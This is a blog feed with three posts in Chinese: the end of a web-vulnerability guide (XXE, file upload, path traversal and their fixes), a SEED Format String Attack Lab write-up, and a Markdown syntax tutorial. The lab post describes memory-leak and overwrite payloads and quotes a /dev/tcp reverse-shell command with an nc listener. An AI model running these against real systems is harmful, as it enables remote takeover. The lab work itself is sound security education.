href="#常见应用场景-5" class="headerlink" title="常见应用场景"></a>常见应用场景</h4><p>XXE可能出现在一切可接受XML文档的业务逻辑处。</p><ul><li>SOAP型Web Server。SOAP（Simple Object Access Protocol）型的Web Server允许我们使用XML格式与服务器进行通信；</li><li>REST型Web Service。采用RESTful架构风格的终端通常都是以JSON作为传输格式，但是许多服务端开发框架也允许基于数据交换的XML格式作为输入，可以通过尝试将 Content-Type修改为application&#x2F;xml，text&#x2F;xml进行验证。</li><li>另外，采用xml的java服务中间件，比如spring，struts2等也可能出现XXE漏洞</li></ul><h4 id="漏洞危害-5"><a href="#漏洞危害-5" class="headerlink" title="漏洞危害"></a>漏洞危害</h4><ol><li>利用 XXE 进行 DOS 攻击；</li><li>读取本地任意敏感文件；</li><li>利用相关协议进行SSRF探测内网主机IP、端口等信息；</li><li>在特定条件下利用Java中的jar:&#x2F;&#x2F; 协议，php 中的 phar:&#x2F;&#x2F;可能导致恶意文件上传；</li><li>PHP中如果安装了expect扩展，可利用XXE执行任意命令</li></ol><h4 id="修复建议-5"><a href="#修复建议-5" class="headerlink" title="修复建议"></a>修复建议</h4><ol><li><p>使用语言中推荐的禁用外部实体的方法：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">libxml_disable_entity_loader</span>(<span class="hljs-literal">true</span>);<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">DocumentBuilderFactory</span> <span class="hljs-variable">dbf</span> <span class="hljs-operator">=</span>DocumentBuilderFactory.newInstance();<br>dbf.setExpandEntityReferences(<span class="hljs-literal">false</span>);<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> lxml <span class="hljs-keyword">import</span> etree<br>xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=<span class="hljs-literal">False</span>))<br></code></pre></td></tr></table></figure></li><li><p>手动黑名单过滤</p></li></ol><p>过滤XML中的相关关键词，比如：&lt;!DOCTYPE、&lt;!ENTITY SYSTEM、PUBLIC等。</p><h3 id="2-7-文件操作漏洞"><a href="#2-7-文件操作漏洞" class="headerlink" title="2.7 文件操作漏洞"></a>2.7 文件操作漏洞</h3><h4 id="2-7-1-File-Upload（文件上传漏洞）"><a href="#2-7-1-File-Upload（文件上传漏洞）" class="headerlink" title="2.7.1  File Upload（文件上传漏洞）"></a>2.7.1  File Upload（文件上传漏洞）</h4><h5 id="漏洞描述-6"><a href="#漏洞描述-6" class="headerlink" title="漏洞描述"></a>漏洞描述</h5><p>应用系统在文件上传功能处对用户上传文件类型、格式、内容等做合法性校验，导致攻击者可以上传Webshell（.php、.jsp、asp等）恶意脚本文件或者非期望格式的文件比如：HTML文件、SHTML文件等，同时可利用目录跳转等字符或者控制上传目录，直接上传文件到Web目录或任意目录下，从而可能导致在远程服务器上执行任意恶意脚本文件，从而直接获取应用系统权限。</p><h5 id="常见应用场景-6"><a href="#常见应用场景-6" class="headerlink" title="常见应用场景"></a>常见应用场景</h5><p>文件上传漏洞通常发生在业务系统需要进行上传文件等功能处，比如上传图片、视频、文档；发表文章、评论；意见反馈；个人信息中的头像，照片，附件等。</p><h5 id="漏洞危害-6"><a href="#漏洞危害-6" class="headerlink" title="漏洞危害"></a>漏洞危害</h5><ol><li>上传恶意脚本文件到服务器中，通过访问该恶意文件从而执行文件中的恶意代码；</li><li>攻击者可利用目录跳转上传php、config等文件，覆盖原有的系统文件，到达篡改系统文件、甚至获取系统权限的目的；</li><li>攻击者可上传html、shtm等文件，并写入非法博彩、赌博等恶意SEO页面或者写入恶意js文件进行钓鱼来非法获取用户信息等；</li></ol><h5 id="修复建议-6"><a href="#修复建议-6" class="headerlink" title="修复建议"></a>修复建议</h5><h6 id="代码层面-2"><a href="#代码层面-2" class="headerlink" title="代码层面"></a>代码层面</h6><ol><li>服务端采用白名单方式校验文件后缀，不建议采用黑名单方式校验后缀，黑名单方式校验可能导致攻击者利用文件特性、系统特性、黑名单不全等方式进行绕过攻击；</li><li>服务端对上传文件进行重命名，防止利用目录跳转等方式控制上传目录；</li><li>服务端使用系统函数来判断文件类型及文件内容是否合法，比如PHP中的getimagesize；</li><li>对上传的文件回显相对路径或者不显示路径；</li></ol><h6 id="其他层面-1"><a href="#其他层面-1" class="headerlink" title="其他层面"></a>其他层面</h6><ol><li>建议使用OSS静态存储服务器来存储用户上传的文件；</li><li>设置目录权限限制，禁止上传目录的执行权限；</li><li>保证使用的Nginx、Apache、IIS等容器版本不存在解析漏洞；</li><li>保证使用的第三方处理软件的版本比如FFmpeg、ImageMagick等不存在已知漏洞</li></ol><h4 id="2-7-2-文件读取-x2F-包含-x2F-下载-x2F-删除"><a href="#2-7-2-文件读取-x2F-包含-x2F-下载-x2F-删除" class="headerlink" title="2.7.2 文件读取&#x2F;包含&#x2F;下载&#x2F;删除"></a>2.7.2 文件读取&#x2F;包含&#x2F;下载&#x2F;删除</h4><h5 id="漏洞描述-7"><a href="#漏洞描述-7" class="headerlink" title="漏洞描述"></a>漏洞描述</h5><ol><li>文件读取&#x2F;下载</li></ol><p>在读取文件内容文件或文件下载处，未严格限制读取&#x2F;下载文件的路径及文件后缀，导致可利用..&#x2F;，#等目录操作字符进行目录穿越、截断等手段，从而读取&#x2F;下载服务器上任意文件，比如配置文件等。</p><ol start="2"><li>文件包含</li></ol><p>在通过PHP的incluede、require等函数引入文件时，由于传入的文件名没有经过合理的校验，从而操作了预想之外的文件，导致意外的文件泄露甚至恶意的代码注入，主要包括本地文件包含和远程文件包含两种形式。</p><ol start="3"><li>文件删除</li></ol><p>应用程序在删除文件前，未对所要删除的文件内容、类型、文件名、文件目录做合法性校验，导致可删除服务器上任意文件，比如删除安装目录中锁文件，直接进行重装应用系统。</p><h5 id="常见应用场景-7"><a href="#常见应用场景-7" class="headerlink" title="常见应用场景"></a>常见应用场景</h5><ol><li>文件读取&#x2F;下载</li></ol><p>读取&#x2F;下载图片、文件内容；下载附件；预览文档；导出文档；修改、保存文档等。</p><ol start="2"><li>文件包含</li></ol><p>比如包含了某个图片、附件、远程URL、从远程获取资源文件等。</p><ol start="3"><li>文件删除</li></ol><p>删除文件、附件、图片、替换、配置等。</p><h5 id="漏洞危害-7"><a href="#漏洞危害-7" class="headerlink" title="漏洞危害"></a>漏洞危害</h5><p><strong>文件读取&#x2F;下载：</strong>如果系统未对读取&#x2F;下载文件的文件目录做限制，攻击者利用此漏洞可直接读取web目录下任意文件，比如配置文件、数据库文件等，甚至直接获取服务器上任意文件内容。<br><strong>文件包含：</strong>攻击者利用此漏洞通过包含含有任意恶意代码的任意格式文件，比如图片文件、log文件等，可直接获取应用系统权限，如果开启了allow_url_fopen&#x2F;allow_url_include等配置，可直接包含远程任意格式文件。<br><strong>文件删除：</strong>攻击者利用此漏洞可直接删除web目录甚至服务器上任意格式文件，直接导致业务系统中断、崩溃。</p><h5 id="修复建议-7"><a href="#修复建议-7" class="headerlink" title="修复建议"></a>修复建议</h5><ol><li>配置文件：在配置文件中限制访问的文件目录，比如PHP中php.ini配置open_basedir；</li><li>特殊字符过滤：检查用户输入，过滤或转义含有“..&#x2F;”、“..\”、“%00”，“..”，“.&#x2F;”，“#”等跳转目录或字符终止符、截断字符的输入；</li><li>合法性判断：严格过滤用户输入字符的合法性，比如文件类型、文件地址、文件内容等；</li><li>白名单：白名单限定访问文件的路径、名称及后缀名。</li></ol><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://vulwiki.readthedocs.io/zh_CN/latest/">https://vulwiki.readthedocs.io/zh_CN&#x2F;latest&#x2F;</a><br><a href="https://blog.csdn.net/qq_41874930/article/details/115398322">https://blog.csdn.net/qq_41874930&#x2F;article&#x2F;details&#x2F;115398322</a><br><a href="https://zhuanlan.zhihu.com/p/364126547">https://zhuanlan.zhihu.com/p/364126547</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Format-String-Attack-Lab</title>
    <link href="/2023/03/09/Format-String-Attack-Lab/"/>
    <url>/2023/03/09/Format-String-Attack-Lab/</url>
    
    <content type="html"><![CDATA[<h2 id="环境设置"><a href="#环境设置" class="headerlink" title="环境设置"></a>环境设置</h2><ol><li>关闭地址随机化</li></ol><p>$ sudo sysctl -w kernel.randomize_va_space&#x3D;0</p><ol start="2"><li>编译format</li></ol><p>$ make<br>$ make install</p><ol start="3"><li>启动docker</li></ol><p>$ docker-compose build # Build the container image<br>$ docker-compose up # Start the container</p><h2 id="Task-1-Crashing-the-Program"><a href="#Task-1-Crashing-the-Program" class="headerlink" title="Task 1: Crashing the Program"></a>Task 1: Crashing the Program</h2><p>我们向服务器发送一条良性的消息时，服务器会正常打印消息并输出：<br>(ˆ_ˆ)(ˆ_ˆ) Returned properly (ˆ_ˆ)(ˆ_ˆ)。但是由于format.c中存在格式字符串漏洞printf(msg);如果我们提供格式字符串输入，那么服务器试图myprintf()函数中打印用户输入时，它将崩溃。如下，当我们提供输入“%s”到服务器，那么服务器将会崩溃：<br><img src="/2023/03/09/Format-String-Attack-Lab/1.png" alt="image.png"></p><h2 id="Task-2-Printing-Out-the-Server-Program’s-Memory"><a href="#Task-2-Printing-Out-the-Server-Program’s-Memory" class="headerlink" title="Task 2: Printing Out the Server Program’s Memory"></a>Task 2: Printing Out the Server Program’s Memory</h2><h3 id="Task-2-A-Stack-Data"><a href="#Task-2-A-Stack-Data" class="headerlink" title="Task 2.A: Stack Data."></a>Task 2.A: Stack Data.</h3><p>利用服务器的格式字符串漏洞，当我们提供输入“%x”，服务器将会打印出栈上的数据，我们的任务是判断需要多少个%x格式说明符才能让服务器打印出输入的前四个字节。为此，我们可以将输入的前四个字节设置为一个唯一的数字，如“0x11111111”，然后向服务器输入很多个%x，观察“0x11111111”在输出的第几个位置，如下：<br><img src="/2023/03/09/Format-String-Attack-Lab/2.png" alt="image.png"><br><img src="/2023/03/09/Format-String-Attack-Lab/3.png" alt="image.png"><br>根据输出我们可以知道，我们传入的输入的前四个字节在di64个%x的位置。</p><h3 id="Task-2-B-Heap-Data"><a href="#Task-2-B-Heap-Data" class="headerlink" title="Task 2.B: Heap Data ."></a>Task 2.B: Heap Data .</h3><p>在堆区域中存储了一个秘密消息(一个字符串)，我们的任务是将这个秘密信息打印出来。首先需要从服务器打印的输出中找到字符串的地址：<br><img src="/2023/03/09/Format-String-Attack-Lab/4.png" alt="image.png"><br>并将这个地址放到格式字符串中。从上一部分我们知道，第64个格式说明符的位置就是缓冲区的内容，因此我们使用%s打印出第64个位置的字符串即是秘密信息，结果如下：<br><img src="/2023/03/09/Format-String-Attack-Lab/5.png" alt="image.png"><br><img src="/2023/03/09/Format-String-Attack-Lab/6.png" alt="image.png"></p><h2 id="Task-3-Modifying-the-Server-Program’s-Memory"><a href="#Task-3-Modifying-the-Server-Program’s-Memory" class="headerlink" title="Task 3: Modifying the Server Program’s Memory"></a>Task 3: Modifying the Server Program’s Memory</h2><p>该任务的目标是修改在服务器程序中定义的目标变量的值。目标变量的原始值为0x11223344。假设这个变量持有一个重要的值，它可以影响程序的控制流。如果远程攻击者可以改变它的值，他们就可以改变这个程序的行为。从输出可以得到目标变量的地址为0x080e5068.<br><img src="/2023/03/09/Format-String-Attack-Lab/7.png" alt="image.png"></p><h3 id="Task-3-A-Change-the-value-to-a-different-value"><a href="#Task-3-A-Change-the-value-to-a-different-value" class="headerlink" title="Task 3.A: Change the value to a different value."></a>Task 3.A: Change the value to a different value.</h3><p>在这个子任务中，只要我们成功将目标变量的值修改即可，而不管它是什么值。我们可以使用%n来完成这个任务，格式说明符%n表示已经写入的字符数应该存储到作为参数传递的变量中，我们可以将它写入到buf当中，如下：<br><img src="/2023/03/09/Format-String-Attack-Lab/8.png" alt="image.png"><br><img src="/2023/03/09/Format-String-Attack-Lab/9.png" alt="image.png"><br>可以看到，目标变量的值变成了0x000001fc。</p><h3 id="Task-3-B-Change-the-value-to-0x5000"><a href="#Task-3-B-Change-the-value-to-0x5000" class="headerlink" title="Task 3.B: Change the value to 0x5000."></a>Task 3.B: Change the value to 0x5000.</h3><p>在此子任务中，我们需要将目标变量的内容更改为特定值0x5000。从A中可以知道想要变成0x5000，那么就要让前面打印的字符串的长度变成0x5000，但是又不能改变指针指向的地址。通过计算可得，0x5000&#x3D;20480&#x3D;4+62*325+326。使用相同的方法构造payload如下：<br><img src="/2023/03/09/Format-String-Attack-Lab/10.png" alt="image.png"><br><img src="/2023/03/09/Format-String-Attack-Lab/11.png" alt="image.png"><br>可以看到，目标变量的值变成了0x00005000。</p><h3 id="Task-3-C-Change-the-value-to-0xAABBCCDD"><a href="#Task-3-C-Change-the-value-to-0xAABBCCDD" class="headerlink" title="Task 3.C: Change the value to 0xAABBCCDD."></a>Task 3.C: Change the value to 0xAABBCCDD.</h3><p>这个子任务与前面的子任务类似，只是目标值现在是一个大数字。在格式字符串攻击中，该值是printf()函数打印出的字符总数;打印这么多字符可能要花几个小时。我们需要使用更快的方法，基本思想是使用%hn，这样我们就可以修改两个字节的内存空间。根据小端法，最高字节的地址为0x080e506a，最低两位字节的地址为0x080e5068。则字符串开头为0x080e506a+”aaaa”+0x080e5068，一共是12个字符。中间四个字节可以是任意值，只是为了提供缓冲区。0xAABB&#x3D;43707&#x3D;12+693*62+729，0xCCDD-0xAABB&#x3D;8738。然后就可以构造payload。<br><img src="/2023/03/09/Format-String-Attack-Lab/12.png" alt="image.png"><br><img src="/2023/03/09/Format-String-Attack-Lab/13.png" alt="image.png"></p><h2 id="Task-4-Inject-Malicious-Code-into-the-Server-Program"><a href="#Task-4-Inject-Malicious-Code-into-the-Server-Program" class="headerlink" title="Task 4: Inject Malicious Code into the Server Program"></a>Task 4: Inject Malicious Code into the Server Program</h2><p>现在我们已经准备好攻击最重要的部分，代码注入。我们想要将一段二进制格式的恶意代码注入到服务器的内存中，然后使用格式字符串漏洞修改函数的返回地址字段，这样当函数返回时，它就会跳转到我们注入的代码。<br>此任务使用的技术与前一个任务类似:它们都修改内存中的4字节数。前一个任务修改的是目标变量，而这个任务修改的是函数的返回地址字段。<br>为了成功完成这个任务，有必要了解在myprintf()中调用printf()函数时的堆栈布局。如下图：<br><img src="/2023/03/09/Format-String-Attack-Lab/14.png" alt="image.png"><br>首先，我们要回答几个问题：<br>Question 1: 标记2和3对应的内存地址是多少？<br>根据server的输出显示，buf的地址为0xffffd5b0, myprintf的帧指针为0xffffd4d8.因此，②：myprintf()的返回地址存储的地址为0xffffd4d8+0x4 &#x3D; 0xffffd4dc。③：用户输入的起始地址0xffffd5b0。<br>Question 2:我们需要多少个%x将指针移动到③？<br>根据Task2.A，我们需要输入63个%x将格式字符串参数指针从1移动到3.<br><img src="/2023/03/09/Format-String-Attack-Lab/15.png" alt="image.png"></p><h3 id="Getting-a-Reverse-Shell"><a href="#Getting-a-Reverse-Shell" class="headerlink" title="Getting a Reverse Shell."></a>Getting a Reverse Shell.</h3><p>要把shellcode注入到服务器执行，首先要确定shellcode的位置，然后我们跳转到shellcode处执行。因此，我们第一步先将shellcode载入到content中，为此，我们先获取到shellcode的长度以获取载入位置。在exploit中打印len(shellcode)结果如下：<br><img src="/2023/03/09/Format-String-Attack-Lab/16.png" alt="image.png"><br>将shellcode放在buf末尾，则shellcode的起始地址为<br>buf+1500-len(shellcode) &#x3D; 0xffffd5b0 + 1500 – 136 &#x3D; 0xffffdb04.<br>采用task3.C相同方式将shellcode的地址写入到myprintf()的返回地址.<br>0xffff&#x3D;65535&#x3D;12+62*1056+51,注意0xdb04 &lt; 0xffff,因此通过打印0x1db04个字符造成溢出从而打印0xdb04，0x1db04 – 0xffff &#x3D; 56069.构造payload如下：<img src="/2023/03/09/Format-String-Attack-Lab/17.png" alt="image.png"><br>注意shellcode中 ls 那一行修改为 “&#x2F;bin&#x2F;bash -i &gt; &#x2F;dev&#x2F;tcp&#x2F;10.9.0.1&#x2F;9090 0&lt;&amp;1 2&gt;&amp;1 *”，然后在本地执行 nc -nv -l 9090 监听本地 9090 端口的 tcp 连接。<br>运行结果：<br>服务器：<br><img src="/2023/03/09/Format-String-Attack-Lab/18.png" alt="image.png"><br>监听窗口：<br><img src="/2023/03/09/Format-String-Attack-Lab/19.png" alt="image.png"></p><h2 id="Task-5-Attacking-the-64-bit-Server-Program"><a href="#Task-5-Attacking-the-64-bit-Server-Program" class="headerlink" title="Task 5: Attacking the 64-bit Server Program"></a>Task 5: Attacking the 64-bit Server Program</h2><p>在前面的任务中，我们的目标服务器是32位程序。在本任务中，我们切换到64位服务器程序。我们的新目标是10.9.0.6，它运行64位版本的format程序。首先向该服务器发送一个hello消息,可以看到帧指针和缓冲区地址的值变成了8个字节长(而不是32位程序中的4个字节)。我们的工作是构造有效负载以利用服务器的格式字符串漏洞。最终目标是在目标服务器上获得根shell。需要使用64位版本的shellcode。<br><img src="/2023/03/09/Format-String-Attack-Lab/20.png" alt="image.png"><br><strong>64位地址引起的挑战。</strong>x64架构带来的一个挑战是地址中的零。虽然x64架构支持64位地址空间，但只允许从0x00到0x00007FFFFFFFFFFF的地址。这意味着对于每个地址(8字节)，最高的两个字节总是零。这就产生了一个问题。如果在格式字符串的中间放置一个地址，当printf()解析格式字符串时，它将在看到零时停止解析。基本上，格式字符串中第一个零之后的任何内容都不会被视为格式字符串的一部分。这里，我们在程序中没有内存拷贝，所以我们可以在输入中有0，但是把它们放在哪里是很关键的。</p><h4 id="一个小技巧"><a href="#一个小技巧" class="headerlink" title="一个小技巧"></a>一个小技巧</h4><p>自由的移动参数指针。我们可以使用 k$ 将参数移动到第 k 个参数的位置。比如 %3$.20x 表示将参数移动到第 3 个，然后以 %.20x 的格式输出。</p><h4 id="测试-content-0-的偏移"><a href="#测试-content-0-的偏移" class="headerlink" title="测试 content[0] 的偏移"></a>测试 content[0] 的偏移</h4><p>参照Task2.A，构造payload可以得出需要34个%x来输出第一个字节。<br><img src="/2023/03/09/Format-String-Attack-Lab/21.png" alt="image.png"><br><img src="/2023/03/09/Format-String-Attack-Lab/22.png" alt="image.png"><br>同上，我们可以得到len(shellcode) &#x3D; 165，myprintf的返回地址为0x00007fffffffe420+8 &#x3D; 0x00007fffffffe428。将shellcode放在buf末尾，则shellcode的起始地址为buf+1500-len(shellcode) &#x3D; 0x00007fffffffe4e0 + 1500 – 165 &#x3D; 0x00007fffffffea17.然后我们开始构造payload，如下：<br><img src="/2023/03/09/Format-String-Attack-Lab/23.png" alt="image.png"><br><strong>注意，与32位不同的是，在构造content时，我们要把格式字符串放在地址的前面，否则printf()解析格式字符串时，它将在看到零时停止解析。并且由于我们采用%46$hn这样的方式移动参数，要把参数的位置计算正确，如因为content[0]是第34个参数，那么content[80:88]所在的参数位置就是34+80&#x2F;8 &#x3D; 44。</strong><br>运行结果：成功拿到reverse shell。<br><img src="/2023/03/09/Format-String-Attack-Lab/24.png" alt="image.png"></p><h2 id="Task-6-Fixing-the-Problem"><a href="#Task-6-Fixing-the-Problem" class="headerlink" title="Task 6: Fixing the Problem"></a>Task 6: Fixing the Problem</h2><p>回顾gcc编译生成的警告信息：<br><img src="/2023/03/09/Format-String-Attack-Lab/25.png" alt="image.png"><br>问题就出在printf（）中没有格式说明符，修复如下：<br><img src="/2023/03/09/Format-String-Attack-Lab/26.png" alt="image.png"><br>这样我们输入什么，输出也就是什么，不会再造成漏洞。再编译一下，已经没有警告消息：<br><img src="/2023/03/09/Format-String-Attack-Lab/27.png" alt="image.png"><br>并且再进行攻击尝试，发现攻击已经失效。</p>]]></content>
    
    
    
    <tags>
      
      <tag>原创</tag>
      
      <tag>seed</tag>
      
      <tag>软件安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>markdown基本语法</title>
    <link href="/2023/03/09/markdown%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/"/>
    <url>/2023/03/09/markdown%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<h1 id="Markdown基本语法"><a href="#Markdown基本语法" class="headerlink" title="Markdown基本语法"></a>Markdown基本语法</h1><p>大三了，菜鸡本人终于准备开始写博客了（可惜了之前学那么多东西都没有记录下来，导致现在大部分都忘得差不多了，哭）。作为开始，当然是学习Markdown啦，以前也用过但是没有系统整理过markdown的基本语法，正好作为第一篇博客水一水（bushi）。话不多说，开始我的博客生涯!</p><hr><h1 id="后缀"><a href="#后缀" class="headerlink" title="后缀"></a>后缀</h1><p>新建文件xxx.md，后缀是 <strong>.md</strong></p><h1 id="标题"><a href="#标题" class="headerlink" title="标题"></a>标题</h1><p>“#”表示一级标题，“##”表示二级，以此类推。</p><h2 id="可选语法"><a href="#可选语法" class="headerlink" title="可选语法"></a>可选语法</h2><p>还可在文本下方添加任意数量的‘&#x3D;’号标识一级标题，或者用‘-’号标识二级标题。</p><pre><code class="hljs">注意：不同的Markdown应用程序处理‘#’和标题之间的空格方式并不一致。为了兼容考虑，使用一个空格在‘#’与标题之间进行分隔。</code></pre><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>正文直接输入就可以了</p><h1 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h1><h2 id="1-markdown段落"><a href="#1-markdown段落" class="headerlink" title="1. markdown段落"></a>1. markdown段落</h2><p>要创建段落，应该使用空白行将一行或多行文本进行分隔。不应该使用空格或制表符缩进段落。  </p><h2 id="2-markdown换行语法"><a href="#2-markdown换行语法" class="headerlink" title="2. markdown换行语法"></a>2. markdown换行语法</h2><p>在一行的末尾添加两个或多个空格，然后按回车键，即可创建一个换行。<br></p><pre><code class="hljs">注意：几乎每个markdown应用程序都支持两个或多个空格进行换行，称为“结尾空格”的方式，但这是有争议的，因为很难在编辑器中直接看到空格，并且很多人在每个句子后面都会有意或无意地添加两个空格。由于这个原因，几乎每个markdown应用程序都支持另一种换行方式： HTML的&lt;br&gt;标签。  </code></pre><h2 id="3-markdown强调语法"><a href="#3-markdown强调语法" class="headerlink" title="3. markdown强调语法"></a>3. markdown强调语法</h2><h3 id="粗体"><a href="#粗体" class="headerlink" title="粗体"></a>粗体</h3><p>要加粗文本，请在单词或短语的前后各添加两个星号或下划线。如需加粗一个单词或短语的中间部分用于表示强调的话，需要在要加粗部分的两侧各添加两个星号.</p><p>例:  I just love **bold text** . -&gt; I just love <strong>bold text</strong> . <br><br>     I just love __bold text__ . -&gt; I just love <strong>bold text</strong> .<br><br>     Love**is**bold -&gt; Love<strong>is</strong>bold</p><pre><code class="hljs">注意：Markdown 应用程序在如何处理单词或短语中间的下划线上并不一致。为兼容考虑，在单词或短语中间部分加粗的话，请使用星号（asterisks）。</code></pre><h3 id="斜体"><a href="#斜体" class="headerlink" title="斜体"></a>斜体</h3><p>与粗体类似，在要斜体突出部分 前后加上一个星号或下划线。同样，要突出单词的中间部分，在字母前后各添加一个星号，中间不要带空格。</p><pre><code class="hljs">注意：要同时用粗体和斜体突出显示文本，请在单词或短语的前后各添加三个星号或下划线。要加粗并用斜体显示短语或单词的中间部分，请在要突出部分前后各添加三个星号，中间不要带空格。</code></pre><p>例:  I just love *bold text* . -&gt; I just love <em>bold text</em> .<br><br>     I just love _bold text_ . -&gt; I just love <em>bold text</em> . <br><br>     Love***is***bold -&gt; Love<em><strong>is</strong></em>bold</p><h2 id="4-markdown引用语法"><a href="#4-markdown引用语法" class="headerlink" title="4. markdown引用语法"></a>4. markdown引用语法</h2><p>要创建引用块，应在段落前添加一个’&gt;’符号。<br></p><pre><code class="hljs">&gt; 这是一个引用 -&gt; </code></pre><blockquote><p>这是一个引用</p></blockquote><h3 id="多个段落的块引用"><a href="#多个段落的块引用" class="headerlink" title="多个段落的块引用"></a>多个段落的块引用</h3><p>块引用可以包含多个段落。为段落之间添加的空白行也添加一个’&gt;’即可。<br></p><pre><code class="hljs">&gt; Dorothy followed her through many of the beautiful rooms in her castle.  &gt;   &gt; The Witch bade her clean the pots and kettles and sweep the floor and keep the fire fed with wood.</code></pre><blockquote><p>Dorothy followed her through many of the beautiful rooms in her castle.  </p><p>The Witch bade her clean the pots and kettles and sweep the floor and keep the fire fed with wood.</p></blockquote><h3 id="嵌套块引用"><a href="#嵌套块引用" class="headerlink" title="嵌套块引用"></a>嵌套块引用</h3><p>块引用可以嵌套，在要嵌套的段落前添加一个’&gt;’符号即可。<br></p><pre><code class="hljs">&gt; Dorothy followed her through many of the beautiful rooms in her castle.&gt;&gt;&gt; The Witch bade her clean the pots and kettles and sweep the floor and keep the fire fed with wood.</code></pre><blockquote><p>Dorothy followed her through many of the beautiful rooms in her castle.</p><blockquote><p>The Witch bade her clean the pots and kettles and sweep the floor and keep the fire fed with wood.</p></blockquote></blockquote><h3 id="带有其他元素的块引用"><a href="#带有其他元素的块引用" class="headerlink" title="带有其他元素的块引用"></a>带有其他元素的块引用</h3><p>块引用可以包含其他markdown格式的元素，如<br></p><pre><code class="hljs">&gt; #### The quarterly results look great!&gt;&gt; - Revenue was off the chart.&gt; - Profits were higher than ever.&gt;&gt;  *Everything* is going according to **plan**.</code></pre><blockquote><h4 id="The-quarterly-results-look-great"><a href="#The-quarterly-results-look-great" class="headerlink" title="The quarterly results look great!"></a>The quarterly results look great!</h4><ul><li>Revenue was off the chart.</li><li>Profits were higher than ever.</li></ul><p> <em>Everything</em> is going according to <strong>plan</strong>.</p></blockquote><h2 id="5-mrakdown列表语法"><a href="#5-mrakdown列表语法" class="headerlink" title="5. mrakdown列表语法"></a>5. mrakdown列表语法</h2><h3 id="有序列表"><a href="#有序列表" class="headerlink" title="有序列表"></a>有序列表</h3><p>要创建有序列表，应在每个列表项前添加数字并紧跟一个英文句点.数字不必按照数学顺序排列，但是列表应当以数字1开始。</p><p>例：<br></p><pre><code class="hljs">1. First item1. Second item1. Third item1. Fourth item</code></pre><ol><li>First item</li><li>Second item</li><li>Third item</li><li>Fourth item</li></ol><h3 id="无序列表"><a href="#无序列表" class="headerlink" title="无序列表"></a>无序列表</h3><p>要创建无序列表，需要在每个列表项前面添加’-‘、’*’或’+’。缩进一个或多个列表项可以创建嵌套列表。</p><p>例：<br></p><pre><code class="hljs">- First item    - Second item        - Third item- Fourth item</code></pre><ul><li>First item<ul><li>Second item<ul><li>Third item</li></ul></li></ul></li><li>Fourth item</li></ul><p>注意：不要混合使用开始符号</p><h3 id="在列表中嵌套其他元素"><a href="#在列表中嵌套其他元素" class="headerlink" title="在列表中嵌套其他元素"></a>在列表中嵌套其他元素</h3><p> 要在保留列表连续性的同时在列表中添加另一种元素，需要将该元素缩进四个空格或一个制表符。<br><br> 如：<br><br> 段落：</p><pre><code class="hljs">*   This is the first list item.*   Here&#39;s the second list item.    I need to add another paragraph below the second list item.*   And here&#39;s the third list item.</code></pre><ul><li><p>This is the first list item.</p></li><li><p>Here’s the second list item.</p><p>I need to add another paragraph below the second list item.</p></li><li><p>And here’s the third list item.</p></li></ul><p>引用块：  </p><pre><code class="hljs">*   This is the first list item.*   Here&#39;s the second list item.    &gt; A blockquote would look great below the second list item.*   And here&#39;s the third list item.</code></pre><ul><li><p>This is the first list item.</p></li><li><p>Here’s the second list item.</p><blockquote><p>A blockquote would look great below the second list item.</p></blockquote></li><li><p>And here’s the third list item.</p></li></ul><p>代码块：<br>代码块通常采用四个空格或一个制表符缩进。当他们被放入列表时，需要缩进八个空格或两个制表符。</p><ol><li><p>Open the file.</p></li><li><p>Find the following code block on line 21:</p><pre><code class="hljs">&lt;html&gt;  &lt;head&gt;    &lt;title&gt;Test&lt;/title&gt;  &lt;/head&gt;</code></pre></li><li><p>Update the title to match the name of your website.</p></li></ol><p>图片：  </p><pre><code class="hljs">1.  Open the file containing the Linux mascot.2.  Marvel at its beauty.    ![Tux, the Linux mascot](/Tux.png)3.  Close the file.</code></pre><ol><li><p>Open the file containing the Linux mascot.</p></li><li><p>Marvel at its beauty.</p><p><img src="/2023/03/09/markdown%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/Tux.png" alt="Tux, the Linux mascot"></p></li><li><p>Close the file.</p></li></ol><p>列表：</p><ol><li>First item</li><li>Second item</li><li>Third item<ul><li>Indented item</li><li>Indented item</li></ul></li><li>Fourth item</li></ol><h2 id="6-markdown代码语法"><a href="#6-markdown代码语法" class="headerlink" title="6. markdown代码语法"></a>6. markdown代码语法</h2><p>要将单词或短语表示为代码，需将其包裹在反引号中。<br><br>例： </p><pre><code class="hljs">At the command prompt, type `nano`.  </code></pre><p>At the command prompt, type <code>nano</code>.</p><h3 id="转义反引号"><a href="#转义反引号" class="headerlink" title="转义反引号"></a>转义反引号</h3><p>若要表示为代码的单词或短语中包含一个或多个反引号，则可以通过将单词或短语包裹在双反引号中。<br>例： </p><pre><code class="hljs">``Use `code` in your Markdown file.``</code></pre><p><code>Use `code` in your Markdown file.</code></p><h3 id="代码块"><a href="#代码块" class="headerlink" title="代码块"></a>代码块</h3><p>要创建代码块，需要将代码块的每一行缩进至少四个空格或制表符。<br></p><pre><code class="hljs">&lt;html&gt;  &lt;head&gt;  &lt;/head&gt;&lt;/html&gt;</code></pre><p>注意：要创建不用缩进的代码块，需使用围栏式代码块。</p><h2 id="7-markdown分割线语法"><a href="#7-markdown分割线语法" class="headerlink" title="7. markdown分割线语法"></a>7. 